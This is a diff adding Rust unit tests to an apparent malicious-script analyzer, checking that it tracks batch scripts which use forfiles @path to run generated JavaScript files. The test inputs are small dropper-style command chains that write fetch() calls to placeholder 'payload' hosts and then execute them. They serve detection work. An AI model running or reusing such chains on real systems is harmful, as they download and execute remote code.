@@ -13499,6 +13499,53 @@ forfiles /m payload.txt /c "%COMSPEC% /V:ON /c set U=https://forfiles-escaped.ex
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn forfiles_path_placeholder_feeds_tracked_script_execution() {
+        let script = br#"echo fetch('https://forfiles-path.example/payload') > C:\Work\run.js
+forfiles /p C:\Work /m *.js /c "cmd /c @path""#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::WscriptExec { src } if src == r#"c:\work\run.js"#) }),
+            "forfiles @path did not dispatch generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://forfiles-path.example/payload")
+            }),
+            "forfiles @path child did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn forfiles_path_placeholder_runs_for_each_tracked_match() {
+        let script = br#"echo fetch('https://forfiles-a.example/payload') > C:\Work\a.js
+echo fetch('https://forfiles-b.example/payload') > C:\Work\b.js
+forfiles /p C:\Work /m *.js /c "cmd /c @path""#;
+        let report = analyze(script, &Config::default());
+
+        for expected in [
+            "https://forfiles-a.example/payload",
+            "https://forfiles-b.example/payload",
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Download { src, .. } if src == expected)),
+                "forfiles @path did not analyze {expected}: {:?}\n{}",
+                report.traits,
+                report.deobfuscated
+            );
+        }
+    }
 }
 
 #[cfg(test)]
